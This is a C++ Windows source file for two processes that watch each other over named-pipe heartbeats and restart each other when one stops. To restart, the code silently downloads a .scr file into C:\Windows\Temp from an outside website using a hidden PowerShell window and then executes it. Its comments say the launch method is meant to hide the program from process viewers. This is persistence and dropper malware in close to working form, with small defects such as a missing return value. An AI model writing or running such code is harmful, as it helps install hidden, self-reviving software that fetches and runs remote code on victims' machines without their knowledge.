#include <windows.h>
#include <tchar.h>
#include <cstdio>
#include <string>
#include <fstream>
#include <psapi.h>
#include <chrono>
#include <atomic>

std::atomic<int> timeSinceLastHeartbeat(0);

bool IsProcessRunning(const std::wstring& processName);
int downloadProgram(LPCWSTR websitePath, LPCWSTR filePathOnWebsite, std::string storagePath);
bool FileExists(const std::wstring& filePath);
void openNotepad();
int restartProgram(int watcherNumber);
DWORD WINAPI HeartbeatReceiver(LPVOID lpParam);
DWORD WINAPI HeartbeatMonitor(LPVOID lpParam);

int _tmain(int argc, _TCHAR* argv[]) {
    if (argc != 2) {
        _tprintf(_T("Please provide a valid watcher number (1 or 2).\n"));
        return -1;
    }

    int watcherNumber = _ttoi(argv[1]);

    if (watcherNumber != 1 && watcherNumber != 2) {
        _tprintf(_T("Invalid watcher number. Must be 1 or 2.\n"));
        return -2;
    }

    // Create the receiver thread
    HANDLE hReceiverThread = CreateThread(
        NULL,
        0,
        HeartbeatReceiver,
        &watcherNumber,
        0,
        NULL);

    if (hReceiverThread == NULL) {
        ExitProcess(3);
    }

    // Create the monitor thread
    HANDLE hMonitorThread = CreateThread(
        NULL,
        0,
        HeartbeatMonitor,
        &watcherNumber,
        0,
        NULL);

    if (hMonitorThread == NULL) {
        ExitProcess(4);
    }

    while (true) {
        Sleep(1000);  // Sleep for 1 second
        timeSinceLastHeartbeat.fetch_add(1);  // Increase the counter

        // If no heartbeat received in the last 5 seconds, take action
        if (timeSinceLastHeartbeat.load() >= 5) {
            // Heartbeat lost. Start the other program again.
            restartProgram(watcherNumber);
            // Optionally reset the counter if needed
            timeSinceLastHeartbeat.store(0);
        }
    }

    CloseHandle(hReceiverThread);
    CloseHandle(hMonitorThread);

    return 0;
}

DWORD WINAPI HeartbeatReceiver(LPVOID lpParam) {
    int watcherNumber = *(int*)lpParam;
    TCHAR pipeName[100];
    _stprintf(pipeName, _T("\\\\.\\pipe\\HeartbeatPipe%dReceiver"), watcherNumber);

    HANDLE hPipe;
    TCHAR buffer[1024];
    DWORD bytesRead;

    while (true) {
        hPipe = CreateNamedPipe(pipeName,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1,
            1024 * 16,
            1024 * 16,
            NMPWAIT_USE_DEFAULT_WAIT,
            NULL);

        if (hPipe != INVALID_HANDLE_VALUE) {
            if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
                if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                    // Reset the counter when heartbeat is received
                    timeSinceLastHeartbeat.store(0);
                }
            }
            DisconnectNamedPipe(hPipe);
        }

        CloseHandle(hPipe);
        Sleep(1000);
    }

    return 0;
}

DWORD WINAPI HeartbeatMonitor(LPVOID lpParam) {
    int watcherNumber = *(int*)lpParam;
    TCHAR pipeName[100];
    _stprintf(pipeName, _T("\\\\.\\pipe\\HeartbeatPipe%dReceiver"), watcherNumber == 1 ? 2 : 1);

    HANDLE hPipe;

    while (true) {
        hPipe = CreateFile(pipeName,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hPipe != INVALID_HANDLE_VALUE) {
            WriteFile(hPipe, TEXT("Heartbeat"), _tcslen(TEXT("Heartbeat")) * sizeof(TCHAR), NULL, NULL);
        }

        CloseHandle(hPipe);
        Sleep(3000);  // Send a heartbeat every 3 seconds
    }

    return 0;
}

int downloadProgram(LPCWSTR websitePath, LPCWSTR filePathOnWebsite, std::string storagePath) {
    std::wstring command = L"powershell Invoke-WebRequest -Uri ";
    command += websitePath;
    command += filePathOnWebsite;
    command += L" -OutFile ";
    command += std::wstring(storagePath.begin(), storagePath.end());
    
    PROCESS_INFORMATION pi;
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return 1; // Error
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return 0;
}

int restartProgram(int watcherNumber) {
    // Powershell starts the program. It dies immediately afterwards
    // This obfuscates it from a cursory glance in process explorer
    // Known as "Process Injection"
    std::string pathToProgram = "C:\\Windows\\Temp\\watcher_1.scr";
    std::wstring pathToProgramW = L"C:\\Windows\\Temp\\watcher_1.scr";
    // Check if the file exists
    if (!FileExists(pathToProgramW)) {
        // If the file doesn't exist, download it
        downloadProgram(L"www.andrewbernal.com/", L"watcher_1.scr", pathToProgram);
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    std::wstring cmdCommand = L"cmd.exe /C start \"\" \"" + pathToProgramW + L"\"";

    // Start the child process. 
    if (!CreateProcessW(NULL,   // No module name (use command line)
        (LPWSTR)cmdCommand.c_str(), // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
    )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }
}